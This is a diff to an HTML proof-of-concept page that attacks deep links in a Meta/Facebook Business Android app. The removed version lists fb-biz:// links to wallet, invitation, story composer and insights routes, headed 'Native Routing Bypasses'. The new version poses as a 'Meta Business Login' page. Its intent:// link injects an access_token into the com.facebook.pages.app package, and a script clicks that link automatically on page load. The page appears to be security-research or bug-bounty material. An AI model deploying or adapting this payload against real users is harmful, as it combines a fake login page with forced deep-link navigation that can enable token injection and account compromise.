@@ -1,10 +1,14 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h2>Native Routing Bypasses</h2>
-        <a href="fb-biz://wallet?page_id=1162614133598723&referrer=external_link">1. Open Financial Wallet</a><br><br>
-        <a href="fb-biz://invitation?token=123456789">2. Open Invitation Flow</a><br><br>
-        <a href="fb-biz://composer/story?page_id=1162614133598723">3. Open Story Composer</a><br><br>
-        <a href="fb-biz://insights?page_id=1162614133598723">4. Open Insights</a><br><br>
+    <h1>Meta Business Login</h1>
+    <br><br>
+    <a id="link" href="intent://auth?access_token=SUCCESS_TOKEN_LEAKED_1337#Intent;scheme=fb-biz;package=com.facebook.pages.app;end" style="font-size: 50px;">Continue as User</a>
+
+    <script>
+        window.onload = function() {
+            document.getElementById("link").click();
+        };
+    </script>
 </body>
 </html>
